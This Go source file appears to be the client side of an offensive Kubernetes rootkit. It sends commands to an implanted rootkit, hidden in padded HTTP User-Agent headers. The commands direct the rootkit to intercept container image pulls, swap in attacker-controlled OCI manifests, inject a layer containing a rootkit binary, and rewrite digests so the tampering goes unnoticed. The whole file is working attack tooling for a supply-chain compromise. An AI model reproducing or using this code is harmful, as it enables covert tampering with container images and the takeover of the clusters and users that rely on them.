package supply_chain

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type InjectResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, mode, targetImage, payload, output string) error {
	result := &InjectResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch mode {
	case "manifest-replace":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"intercept_pull", "hook container runtime image pull to intercept manifest fetch", "supply_intercept_pull"},
			{"replace_manifest", "substitute OCI manifest with attacker-controlled version", "supply_replace_manifest"},
			{"inject_layer", "add malicious layer containing rootkit binary to image", "supply_inject_layer"},
			{"update_digest", "recalculate and update image digest to match modified content", "supply_update_digest"},
		}
	default: // layer-inject
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"intercept_pull", "hook container runtime image pull to intercept layer download", "supply_intercept_pull"},
			{"craft_layer", "create OCI layer tarball with payload at target path", "supply_craft_layer"},
			{"inject_layer", "append crafted layer to image during pull operation", "supply_inject_layer"},
			{"update_config", "update image config to include new layer in rootfs diff_ids", "supply_update_config"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + mode + "#" + targetImage + "#" + payload
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/supply_chain", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
